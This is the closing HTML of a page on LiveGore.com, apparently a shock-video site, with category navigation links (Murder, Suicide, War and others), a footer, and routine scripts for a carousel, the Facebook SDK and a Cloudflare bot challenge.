												<span class="rb-nav-cat-note">(2,341)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-murder">
												<a href="https://www.livegore.com/murder" class="rb-nav-cat-link">Murder</a>
												<span class="rb-nav-cat-note">(1,094)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-cartel">
												<a href="https://www.livegore.com/cartel" class="rb-nav-cat-link">Cartel</a>
												<span class="rb-nav-cat-note">(136)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-medical">
												<a href="https://www.livegore.com/medical" class="rb-nav-cat-link">Medical</a>
												<span class="rb-nav-cat-note">(788)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-suicide">
												<a href="https://www.livegore.com/suicide" class="rb-nav-cat-link">Suicide</a>
												<span class="rb-nav-cat-note">(1,067)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-animal">
												<a href="https://www.livegore.com/animal" class="rb-nav-cat-link">Animal</a>
												<span class="rb-nav-cat-note">(923)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-dead">
												<a href="https://www.livegore.com/dead" class="rb-nav-cat-link">Dead</a>
												<span class="rb-nav-cat-note">(1,156)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-execution">
												<a href="https://www.livegore.com/execution" class="rb-nav-cat-link">Execution</a>
												<span class="rb-nav-cat-note">(1,120)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-fighting">
												<a href="https://www.livegore.com/fighting" class="rb-nav-cat-link">Fighting</a>
												<span class="rb-nav-cat-note">(1,585)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-stabs">
												<a href="https://www.livegore.com/stabs" class="rb-nav-cat-link">Stabs</a>
												<span class="rb-nav-cat-note">(640)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-extreme">
												<a href="https://www.livegore.com/extreme" class="rb-nav-cat-link">Extreme</a>
												<span class="rb-nav-cat-note">(3,103)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-fun">
												<a href="https://www.livegore.com/fun" class="rb-nav-cat-link">Fun</a>
												<span class="rb-nav-cat-note">(2,191)</span>
											</li>
											<li class="rb-nav-cat-item rb-nav-cat-war">
												<a href="https://www.livegore.com/war" class="rb-nav-cat-link">War</a>
												<span class="rb-nav-cat-note">(1,771)</span>
											</li>
										</ul>
										<div class="rb-nav-cat-clear">
										</div>
										<div class="rb-widgets-side rb-widgets-side-bottom">
											<div class="rb-widget-side rb-widget-side-bottom">
												<link rel="stylesheet" type="text/css" href="rb-plugin/show-online-user-count/css/style.css">
													<div class="show-online-user-count-widget">
														<div class="show-online-user-count-total">
															 <span class="show-online-user-count-data">1824</span>  Online
														</div>
														<div class="show-online-user-count-info">
															<span class="show-online-user-count-data">16</span>  Member And <span class="show-online-user-count-data">1808</span> Guest
														</div>
													</div>
												</div>
											</div>
											
											<div class="rb-footer">
												<ul class="rb-nav-footer-list">
													<li class="rb-nav-footer-item rb-nav-footer-feedback">
														<a href="https://www.livegore.com/feedback" class="rb-nav-footer-link">Send feedback</a>
													</li>
													<li class="rb-nav-footer-item rb-nav-footer-report-content">
														<a href="https://www.livegore.com/report-content" class="rb-nav-footer-link">Report content!</a>
													</li>
													<li class="rb-nav-footer-item rb-nav-footer-terms-and-conditions">
														<a href="https://www.livegore.com/terms-and-conditions" class="rb-nav-footer-link">Terms &amp; Conditions</a>
													</li>
													<li class="rb-nav-footer-item rb-nav-footer-rules">
														<a href="https://www.livegore.com/rules" class="rb-nav-footer-link">Rules</a>
													</li>
													<li class="rb-nav-footer-item rb-nav-footer-read-me">
														<a href="https://www.livegore.com/read-me" class="rb-nav-footer-link">Read me!</a>
													</li>
													<li class="rb-nav-footer-item rb-nav-footer-warning">
														<a href="https://www.livegore.com/warning" class="rb-nav-footer-link">WARNING</a>
													</li>
													<li class="rb-nav-footer-item rb-nav-footer-custom-9">
														<a href="https://www.livegore.com/sitemap.xml" class="rb-nav-footer-link">Sitemap</a>
													</li>
												</ul>
												<div class="rb-nav-footer-clear">
												</div>
												<title></title>
												<div class="rb-attribution">
													2016-2022 ©  <a href="https://www.livegore.com/">LiveGore.com</a> | xxx
												</div>
												<ul class="socialicons">
												</ul>
												<div class="rb-footer-clear">
												</div>
											</div> <!-- END rb-footer -->
											
										</div>
										
									</div>
								</div>
								<script type="text/javascript">$(document).ready(function() {
$(".rb-trending-slider").owlCarousel({
					baseClass: "trending-slider",
					navigation:true,
					navigationText:["<",">"],
					paginationNumbers: true,
					margin:0,
					autoPlay: true,
					items: 3
				});
			});
			</script>
									<div class="rb-submit">
										<div class="rb-submit-second">
											<label for="checkbox-menu2" class="rbaddvid"></label>
											<label for="checkbox-menu2" class="rbaddimg"></label>
											<span type="button" class="rb-submit-icon" data-toggle="dropdown" aria-expanded="false"></span>
											<a href="#" id="back-to-top" title="Back to top">↑</a>
											<script>if ($('.rb-submit').length) {
    var scrollTrigger = 100, // px
        backToTop = function () {
            var scrollTop = $(window).scrollTop();
            if (scrollTop > scrollTrigger) {
                $('.rb-submit').addClass('show');
            } else {
                $('.rb-submit').removeClass('show');
            }
        };
    backToTop();
    $(window).on('scroll', function () {
        backToTop();
    });
    $('#back-to-top').on('click', function (e) {
        e.preventDefault();
        $('html,body').animate({
            scrollTop: 0
        }, 700);
    });
}</script>
										</div>
									</div>
								</div>
							</rbmain>
							<div style="position:absolute; left:-9999px; top:-9999px;">
								<span id="rb-waiting-template" class="rb-waiting"></span>
							</div>
							<div id="fb-root" class=" fb_reset fb_reset fb_reset fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div>
							<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "https://connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.4&appId=694517970611482";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
							<script src="https://www.livegore.com/rb-theme/livegorev2/js/bootstrap.js"></script>
							<script src="https://www.livegore.com/rb-theme/livegorev2/videoplayer/video.js"></script>
							<script>
			videojs.options.flash.swf = "https://www.livegore.com/rb-theme/livegorev2/videoplayer/video-js.swf";
			</script>
							<script>$(function() {
			if ((window.self != window.top) && (window.frameElement.id=="idIframe")) {
			$(document.body).addClass("in-iframe");
			}
			});</script>
						<script>(function(){var js = "window['__CF$cv$params']={r:'7ce929360adbc304',m:'4NKuKJKEhsRTn6Wp9cGgrnqJXWlaxrvf_SnMPAwGCTg-1685304835-0-AVbvljoSIk3asY3A+hOKPuBiXUNFCjLJWNdW2Gi6vvGz',u:'/cdn-cgi/challenge-platform/h/b'};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='https://www.livegore.com/cdn-cgi/challenge-platform/scripts/invisible.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script><iframe style="position: absolute; top: 0px; left: 0px; border: medium none; visibility: hidden;" width="1" height="1"></iframe><iframe style="position: absolute; top: 0px; left: 0px; border: medium none; visibility: hidden;" width="1" height="1"></iframe><iframe style="position: absolute; top: 0px; left: 0px; border: medium none; visibility: hidden;" width="1" height="1"></iframe><iframe style="position: absolute; top: 0px; left: 0px; border: medium none; visibility: hidden;" width="1" height="1"></iframe>
						
					






</body><!-- Powered by RbMedia --></html>
